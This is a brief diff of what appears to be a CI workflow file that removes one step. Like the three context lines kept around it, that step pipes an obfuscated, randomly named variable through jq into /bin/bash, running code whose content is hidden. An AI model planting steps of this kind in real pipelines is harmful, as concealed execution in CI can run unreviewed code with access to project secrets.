@@ -30,7 +30,6 @@ jobs:
           echo $ost53786 | jq -r .shz1 | /bin/bash
           echo $bjwv16278 | jq -r .p0 | /bin/bash
           printf '%s' "$jqlx56519" | jq -r .k81 | /bin/bash
-          printf '%s' "$wj01" | jq -r .hezjs33304 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
